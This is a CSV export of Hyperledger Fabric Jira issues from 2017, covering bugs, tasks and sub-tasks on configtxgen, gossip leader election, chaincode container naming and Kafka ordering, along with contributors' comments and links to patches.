 ",,billotosyr,davidkhala,jichen,jyellick,ruf47,sandp125,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABJ-112,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8h3:",,,,,,,,,,,,,,,,,,,,,,,billotosyr,davidkhala,jichen,jyellick,ruf47,sandp125,scottz,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,dev,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jul/17 6:46 AM;sandp125;Discussed this with [~jyellick]. He found an issue in the code.;;;","14/Jul/17 6:54 AM;scottz;Hi [~jyellick] . It appears Sandeep found a good bug in the configtxgen tool. I think it is ALSO a bug in the orderer, which should not have accepted the create-channel config transaction in the first place because it was incomplete. I would think a modification policy, for every policy, should be required (except for those policies (if any) that can never be changed). Could you put that enforcement in the fabric code too?;;;","14/Jul/17 1:42 PM;jyellick;[~scottz] Yes, this is a good find by [~sandp125]

If this were pre-v1, I would be inclined to make the breaking change you suggest.  However, as this would break existing deployments, I don't think forbidding this action is a good idea for 1.0.1.  I think the appropriate course of action is to add a warning to the log for now, and once we have a way to differentiate between fabric versions, consider enforcing it strictly for new channels.;;;","14/Jul/17 2:15 PM;jyellick;Fix available in review via https://gerrit.hyperledger.org/r/#/c/11645/;;;","23/Aug/17 3:38 PM;jichen;I tried [http://hyperledger-fabric.readthedocs.io|http://hyperledger-fabric.readthedocs.io/] and got following while my configtxgen is 1.0.1 ,any comments? Thanks

 

orderer | 2017-08-23 06:32:44.329 UTC [orderer/common/broadcast] Handle -> WARN 3f2 Rejecting CONFIG_UPDATE because: Error authorizing update: Error validating DeltaSet: invalid mod_policy for element [Policy] /Channel/Application/Writers: mod_policy not set
orderer | 2017-08-23 06:32:44.335 UTC [orderer/main] func1 -> DEBU 3f3 Closing Broadcast stream
orderer | 2017-08-23 06:32:44.335 UTC [orderer/common/deliver] Handle -> WARN 3f4 Error reading from stream: rpc error: code = Canceled desc = context canceled

 

jichen@test2:~/go/fabric-samples/chaincode-docker-devmode$ configtxgen --version
configtxgen:
 Version: 1.0.1
 Go version: go1.7
 OS/Arch: linux/amd64;;;","23/Aug/17 11:35 PM;jyellick;[~jichen] Please double check that you have regenerated the transaction using the 1.0.1 version of {{configtxgen}}.  This error should occur with a v1.0.0 and lower version of {{configtxgen}}.;;;","25/Aug/17 12:33 PM;jichen;[~jyellick] sorry to ask but I am new to blockchain and I am learning through 

[http://hyperledger-fabric.readthedocs.io/en/latest/chaincode4ade.html]

seems it's just a docker compose command to start the environment and I don't know how to use configtxgen explicitly...

I am sure my env is 1.0.1 as it's built 2 days before and I saw this bug already fixed for about 1 month...

 

will check more and see whether I can have any clue , thanks for your info;;;","30/Aug/17 5:35 PM;ruf47;Hello, 

I have the same problem that [~jichen] . 

[~jyellick], you told him that he should use new configtxgen tool. However please note that in project [https://github.com/hyperledger/fabric-samples/tree/release/chaincode-docker-devmode] , artefacts are already generated and posted. Probably the reason of this error is usage of artefacts generated by old configtxgen tool with bug mentioned. Do you know with whom I can contact to regenerate this artefacts and push on GitHub? 

Brgds

Rafal;;;","01/Sep/17 8:44 AM;billotosyr;I've just hit this same problem – and there are many people on the internet reporting it on Stack Overflow and elsewhere. Basically the public fabric-samples don't work. Could someone please regenerate the artifacts with the new configtxgen tool? Thanks.;;;","01/Sep/17 10:41 AM;jyellick;[~billotosyr] [~ruf47] Sorry about this.  I meant to post back after checking with our release manager.  We are very close to cutting v1.0.2 and will be sure to update these samples in the process.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
spelling error in instantiate-chaincode.js of balance-transfer and node sdk ,FAB-5311,19253,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,glindsell,bh4rtp,bh4rtp,14/Jul/17 5:11 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Aug/17 1:51 AM,,,,,,fabric-samples,,,,,,0,,,,,,,"In the app/instantiate-chaincode.js, there is a spelling error at line 148:

return 'Chaincode Instantiateion is SUCCESS';

It should be Instantiation.",,bh4rtp,glindsell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8hr:",,,,,,,,,,,,,,,,,,,,,,,bh4rtp,glindsell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 5:46 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/11649/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Timer for leader election on Org's peers,FAB-5313,19260,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,SotirisAlfonsos,SotirisAlfonsos,14/Jul/17 10:00 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jul/17 11:50 PM,,,,v1.0.1,,fabric-gossip,,,,,,0,active,gossip,,,,,"There was an issue where, if the leader of an organisation starts dropping packets on his communication with the orderer, the entire organisation will never get the new blocks. Killing the leader made the org elect a new leader, that was able to fetch the blocks from the orderer.

Reproducing the issue:

We create the containers where org1 belongs to two channels and controls 2 peers ( _{{peer0.org1.example.com,}}_ _{{peer1.org1.example.com}}_ ). We am triggering the network delays. So an iptables rule that classifies the packets going from the _{{orderer}}_ to _{{peer0.org1.example.com}}_. Then with a _{{tc qdisc}}_ {{rule}} we apply package loss 100% to those packets. 

Now we run our code that goes: user enrollment, channel creation, join channels, install chaincode. Everything works up to that point. Now we are sending two instantiates, one for each channel, and sending them both to  _{{org1}}_. The instantiates are signed by both {{_peer0.org1.example.com_,}} _{{peer1.org1.example.com}}_, and now we would expect for the orderer to send the block to the peers. _{{peer0.org1.example.com}}_ should not receive the block, and he does not. But we would expect that _{{peer1.org1.example.com}}_ would receive the block, but he does not. 

A new leader is not elected so both pears will never get the new blocks.",,SotirisAlfonsos,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzy8in:",,,,,,,,,,,,,,,,,,,,,,,SotirisAlfonsos,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jul/17 11:05 PM;yacovm;[~C0rWin];;;","15/Jul/17 1:00 AM;yacovm;{quote}and now we would expect for the orderer to send the block to the peers. _{{peer0.org1.example.com}}_ should not receive the block
{quote}
So this isn't true. Peers can receive blocks via gossip from one another. 
The problem here is - a peer can be a leader but doesn't relinquish its leadership when it can't connect to the ordering service.

A way to solve this would be to just make the leader election module ""give up"" *for a certain amount of time* if the orderer isn't reachable *and if the given peer is a leader*.
If the orderer is unreachable for all peers - we would expect the first leader to give up, then the second to give up, and so on and so forth in a rotating fashion until the ordering service would be reachable again.

 

[~C0rWin] 
[~gennadyl] 

Thoughts?;;;","23/Jul/17 8:20 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/11751/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
A peer can relay chaincode installation request to another peer,FAB-5316,19265,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,elli-androulaki,elli-androulaki,15/Jul/17 12:22 AM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:06 PM,v1.0.5,,,,,fabric-crypto,,,,,,1,Security,,,,,,"A chaincode installation request is relayable. This means that when a peer receives an cc installation request can simply submit this request to other peers of the same organisation and extend the availability of this chaincode to peers who are not supposed to have this chaincode installed.

Solution: *bind* chaincode installation request, as well as other request to their intended recipient.",,elli-androulaki,JonathanLevi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzxy6v:",,,,,,,,,,,,,,,,,,,,,,,elli-androulaki,JonathanLevi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Aug/17 6:44 PM;elli-androulaki;This would be covered with FAB-1753.;;;","14/Mar/18 8:28 PM;elli-androulaki;Marking this as duplicate due to it similarity with 1753.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Cleanup cruft from filters, like the Accept/Reject/Forward notion",FAB-5317,19268,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,15/Jul/17 2:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 10:10 PM,,,,v1.1.0,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8jb:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:54 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11653/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
copy npm debug.log file to Jenkins Workspace dir in CI,FAB-5318,19269,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,15/Jul/17 3:27 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Jul/17 4:15 AM,,,,,,fabric-build,,,,,,0,,,,,,,update fabric-sdk-node CI script to copy npm debug.log file to Jenkins Workspace dir.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8jj:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jul/17 4:15 AM;rameshthoomu;patch has been submitted and merged. https://gerrit.hyperledger.org/r/#/c/11659/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Respect `peer.tls.serverhostoverride` in `peer channel create` or add a new flag/variable to allow overriding the the tls serverhostoverride for `peer channel` commands,FAB-5319,19270,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,jyellick,tongliofcary,tongliofcary,15/Jul/17 4:12 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,20/Jul/17 8:22 AM,v1.0.0,,,v1.1.0,,fabric-peer,fabric-tools,,,,,0,,,,,,,"When use peer channel create, -o option indictes the target where the orderer service is, and also the entry in the certificates stack. In some sitiuations, the endpoint which should be resolved to IP address may not be necessarily the entry in the certificate stack. Either a new command parameter is needed or respect the env peer.serverhostoverride to make sure that when endpoint IP address does not necessarily match the certificate entry, the peer channel create command will still work.",,inatatsu,jyellick,lmars,tongliofcary,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8jr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,inatatsu,jyellick,lmars,tongliofcary,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jul/17 11:13 AM;jyellick;Added a new flag: {{-ordererTLSHostnameOverride}} to the {{peer channel]} set of commands via https://gerrit.hyperledger.org/r/#/c/11677/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Decrease auction invoke test time ,FAB-5320,19272,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sandp125,rameshthoomu,rameshthoomu,15/Jul/17 4:27 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/18 7:16 AM,v1.0.0-rc1,,,Future,,fabric-build,,,,,,0,build-system,,,,,,Observed auction invoke test is taking 2 hrs to complete and this needs to redefine the test parameters using. We are using this test in daily and release test suite.,,ChristopherFerris,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8jz:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 10:57 PM;rameshthoomu;patch has been submitted.. In-review https://gerrit.hyperledger.org/r/#/c/11711/;;;","22/Apr/18 10:44 PM;ChristopherFerris;Is this still relevant? Seems to be something that could be closed...;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
docker-compose example using host time,FAB-5322,19276,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,liuwenliang0632,liuwenliang0632,liuwenliang0632,15/Jul/17 2:06 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Oct/17 3:23 AM,v1.0.0,,,Not a Bug,,fabric-samples,,,,,,0,,,,,,,when i test e2e. the time looks diffurent between container and my host time.,,ChristopherFerris,liuwenliang0632,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8kf:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,liuwenliang0632,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jul/17 6:33 PM;mastersingh24;[~liuwenliang0632] This is not a bug at the fabric level.  There should not be any time skew when running Docker on Linux, but if running Docker for Mac / Windows or Docker Toolbox for Mac / Windows this does happen occasionally.  The best course of action is to restart Docker on those host platforms.  The issue there is that Docker runs on a VM and the VM can be out of sync with the host;;;","13/Sep/17 9:26 PM;ChristopherFerris;[https://gerrit.hyperledger.org/r/c/11665/]

IMO, this CR should be abandoned and the JIRA closed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Provide a sample config for Kafka-based ordering service,FAB-5323,19277,15929,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,,mastersingh24,mastersingh24,15/Jul/17 7:36 PM,25/Apr/19 7:33 PM,28/Oct/23 3:00 AM,25/Apr/19 7:33 PM,v1.0.0,,,,,fabric-samples,,,,,,3,,,,,,,"The current basic and first network samples use the Solo orderer (which makes sense as they are geared towards getting sample networks up and running for development).

For production topologies, people will use the Kafka-based orderer and we need a sample config which demonstrates how to get one up and running.",,AshishkumarLakshmanan,erimori,mastersingh24,pdina,SashaPESIC,shanlusun,spipes,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzxqtr:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,AshishkumarLakshmanan,erimori,mastersingh24,pdina,SashaPESIC,shanlusun,spipes,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Mar/18 5:54 AM;mastersingh24;Kafka option added to byfn;;;","14/Jun/18 3:22 AM;SashaPESIC;[~mastersingh24] Where is the option/config located? ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add test infrastructure for `Broadcast` API,FAB-5325,19279,19124,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,16/Jul/17 3:00 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 12:07 AM,,,,,,,,,,,,0,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8kv:",,,,,,,,,,,,,,,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jul/17 3:00 AM;guoger;https://gerrit.hyperledger.org/r/#/c/11613/
https://gerrit.hyperledger.org/r/#/c/11611/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add tests for `Deliver` API,FAB-5326,19280,19124,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,16/Jul/17 3:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 12:07 AM,,,,,,,,,,,,0,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8l3:",,,,,,,,,,,,,,,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jul/17 3:21 AM;guoger;https://gerrit.hyperledger.org/r/#/c/11613/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Start Kafka service in docker automatically,FAB-5327,19281,19124,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid,,guoger,guoger,16/Jul/17 3:06 AM,30/Jul/19 10:05 AM,28/Oct/23 3:00 AM,30/Jul/19 10:05 AM,,,,,,,,,,,,0,,,,,,,"In the implementation of FAB-5325, when testing against Kafka, we need to manually start a kafka service at localhost:9092. Ideally we could automate this process in the code as part of test environment setup, i.e. start a kafka docker container for each test run.

To prevent each test run from reloading previous config in system chain, we use randomly generated system chain name every time, `system-chain-XXXXX`, as a workaround. Using ephemeral container could eliminate this as well.",,guoger,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8lb:",,,,,,,,,,,,,,,,,,,,,,,guoger,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 10:05 AM;mastersingh24;Integration tests take care of this now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Multiple orderer process in Kafka mode,FAB-5328,19282,19124,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,16/Jul/17 3:08 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 12:07 AM,,,,,,,,,,,,0,,,,,,,There should be multiple orderer instances in a realistic setup. We should reflect this in the benchmark tests as well.,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8lj:",,,,,,,,,,,,,,,,,,,,,,,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jul/17 3:21 AM;guoger;https://gerrit.hyperledger.org/r/#/c/11613/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Able to instantiate on a taken chaincode ID by changing case,FAB-5329,19283,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,dshuffma,dshuffma,16/Jul/17 3:59 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jul/17 5:50 AM,v1.0.0-rc1,,,v1.0.1,,fabric-peer,,,,,,0,,,,,,,"First step I did is install and instantiated chaincode ID _{{marblesRC1}}_. notice the *uppercase* _RC_.
 * worked just fine no errors
 * looking at the chaincode's container name: _[truncated]-fabric-peer-org1-28882c0-marblesrc1-v4_
 **  it does *NOT* contain any uppercase characters
 * I ran marbles on this chaincode. The SDK apis was fed _{{marblesRC1.}}_ {{notice the }}*uppercase* letters and worked just fine reaching the lowercase docker container.
 * APIs such as list install chaincode have the case preserved as _{{marblesRC1}}_
 * Everything seems happy so far

Second step I did is install and instantiate chaincode _{{marblesrc1}}_. notice the *lowercase* _rc_.
 * worked just fine no errors (this is surprising)
 * looking for the chaincode's docker container I found that there are *no* new containers! it reused the same container.... *this is bad*
 ** I confirmed its the same container by looking at the status up time. It had been reset since the 1st instantiate

 

Whatever code is running to see if a chaincode ID is already in use is currently case sensitive.  This is a problem since something (maybe docker?) is translating them to lowercase.

 
 * I'm using fabric v1 RC1 via the bluemix service.
 * Install/instantiate were done using the SDK v1.0.0-rc1

 

Also note that instantiate will fail if I try the exact ID twice, as expected.  ex: instantiate *marblestest* twice will fail on the 2nd attempt. (this is good)

 

 

 

 ",,dshuffma,muralisr,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8lr:",,,,,,,,,,,,,,,,,,,,,,,dshuffma,muralisr,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 5:40 AM;yacovm;It's supposed to be a different one (I tried something similar locally and the id of the container changed). I'm sure that if you take a look you'll see it's id (using docker ps) is different.;;;","18/Jul/17 5:44 AM;yacovm;[~muralisr] ^;;;","18/Jul/17 7:23 AM;muralisr;[~dshuffma] [~yacovm] Docker does not allow uppercase letters. We used pass names directly to Docker and report any error back to user. However that was changed by name sanitization in https://jira.hyperledger.org/browse/FAB-2929. 

We could do one of the following
 # prohibit users from using uppercase chars in chaincode name
 # return error name resolves to an existing chaincode name after sanitization (ie, ""A"" is allowed if \{""A"" or ""a""} does not exist)
 # add a  ""-""  or ""."" in front of each upper case char in the docker name before sanitization.  Those chars are allowed by docker but not by the fabric in a chaincode name.

(1) is unreasonably restrictive and elevates docker-specific restriction to all chaincodes
(2) is arbitrary  - sometimes upper case will work and sometimes not.
(3) seems reasonable and self-contained to dockercontroller. No other component need to change.

[~binhn] [~greg.haskins] [~mastersingh24]

Thoughts please ?;;;","18/Jul/17 2:21 PM;yacovm;What if we hash the CC name and append it to the image name?

So image name of exampleCC would be translated to *{{dev-peer-examplecc-1.0-3cd162fc0f9ad15eb7ff6331a193996c65654da4}}* 

and image name of examplecc would be translated to *{{dev-peer-examplecc-1.0-7c026e4e18ca1345e918b4da5a043e2001082a68}}* 

or do you need a backwards translation too from the image name to the CC name?;;;","18/Jul/17 11:33 PM;muralisr;[~yacovm] now that would be too easy wouldn't it ;-)  ?

We don't need backward translation and you are absolutely right, I like using hash way better.;;;","19/Jul/17 2:25 AM;dshuffma;I don't care what specific solution you guys come up with. What I do need is the ability to get a docker status on the container. (to figure out if its running and for how long). Therefore if you do *any* manipulation of the name, you need to record it somewhere that I can read from later. So that I can look up the correct *container's* status via docker.  Such as when I ask the peer to list the chaincode instantiated on this channel, that name data should be there.

 

from a debugging perspective hashing the name is a huge pain in the ass.  I won't know which container is which with out looking it up. ie when I want to grab logs of the container running chaincode id *testChaincode*, you've now made that much more complicated.;;;","19/Jul/17 2:58 AM;muralisr;[~dshuffma] the main issue is we are converting caps to small (thanks to docker restriction) and have collision with docker names. The secondary issue is you want to know the chaincode name given the container name.

*dev-peer-examplecc-1.0-7c026e4e18ca1345e918b4da5a043e2001082a68* contains both the original string and the hash . We have to have *something* in the name that differentiates.

Note that using just *7c026e4e18ca1345e918b4da5a043e2001082a68* as the container name would have worked as well but would have been harder to map for you.;;;","19/Jul/17 11:39 PM;dshuffma;sounds good to me;;;","20/Jul/17 12:38 AM;dshuffma;yes! that would be great. 

just to reiterate: I need the actual in use docker container name to programmatically look up the chaincode container's status and logs. So including the full name, anywhere, would be super helpful.;;;","20/Jul/17 12:55 AM;wlahti;I removed my previous comment prior to your response but maybe I should have just edited it. I'm trying to see if there's any good way to provide more information about which container is which. Modifying the LSCC to contain container name doesn't seem like a feasible/smart solution.;;;","20/Jul/17 11:18 PM;wlahti;I plan to resolve this (and address David's usability concern) by 1) adding the hash to the end of the image name (as this is the only part where Docker requires all lowercase) and 2) preserving the capitalization in the container name. This should ensure that a chaincode named mycc will not have its container taken by a later instantiation of chaincode myCC. 
{code:java}
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
834d6283bfc7 dev-peer0.org2.example.com-mycc-1.0-f90580f44c3faa95cf2e20d41f5fbb5e89d4234ecbf3589f20b419888b187f81 ""chaincode -peer.a..."" 1 second ago Up Less than a second dev-peer0.org2.example.com-myCC-1.0
7bdc455fbb5a dev-peer0.org2.example.com-mycc-1.0-15b571b3ce849066b7ec74497da3b27e54e0df1345daff3951b94245ce09c42b ""chaincode -peer.a..."" 40 seconds ago Up 39 seconds dev-peer0.org2.example.com-mycc-1.0{code};;;","25/Jul/17 11:52 AM;wlahti;CR submitted to gerrit and awaiting review: https://gerrit.hyperledger.org/r/#/c/11819/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,
Prevent state transfer payload buffer overpopulation,FAB-5330,19284,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,16/Jul/17 9:46 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jul/17 4:27 AM,v1.0.0,,,v1.0.1,,fabric-gossip,,,,,,0,active,gossip,,,,,"The state transfer module receives blocks from either the orderer or from other peers and puts them into a payload buffer, where blocks are reordered in order to be sent into the ledger in-order.

In some cases, the payload buffer may fill up and over-populate:
 * If a peer is missing lots of blocks because it joined the channel late, it will receive blocks from other peers  but won't be able to commit them until it receives the missing blocks it needs from neighboring peers. In the meantime - the blocks from the ordering service would be kept in the payload buffer
 * If the ledger is stuck (i.e file system full) the peer would still end up filling the payload buffer

What we probably need to do is to skip putting blocks into the payload buffer, if the difference in the block sequence and the ledger height is bigger than some configurable size.

 

[~C0rWin]

[~gennadyl]",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8lz:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Jul/17 1:26 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/11727/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
